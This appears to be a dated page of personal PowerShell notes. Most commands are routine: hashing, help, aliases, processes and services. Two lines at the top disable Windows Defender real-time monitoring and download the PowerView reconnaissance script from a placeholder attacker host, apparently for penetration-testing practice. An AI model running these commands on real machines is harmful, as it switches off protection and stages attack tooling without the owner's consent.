### 25-Jan-24-Thu

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

```
Invoke-WebRequest http://<ip>:<port>/PowerView.ps1 -OutFile PowerView.ps1
```

```
Get-FileHash somefile.ext
```

```
Get-FileHash somfile.ext -Algorithm MD5
```

```
$psversiontable
```

![image](https://github.com/user-attachments/assets/20e96730-c065-4775-b430-3bc1c80f5979)

```
Get-Help Get-Help
```

![image](https://github.com/user-attachments/assets/7aabfd9f-168e-434d-80d5-d9ee4937fbb3)

```
Get-Help -Name Get-Command -Detailed
```

![image](https://github.com/user-attachments/assets/bba5f21b-42d0-42c2-8ae9-da9146982a39)

```
alias
```

![image](https://github.com/user-attachments/assets/64d4d22c-35ec-4ace-bae2-46925963d014)

```
Get-Process
```

```
Stop-Process -id 12345
```

```
Get-Service |Select-Object Status,Name
```

```
Get-Service | Where-Object Status -eq "Running"
```

```
Get-Service | Where-Object Status -ne "Running"
```
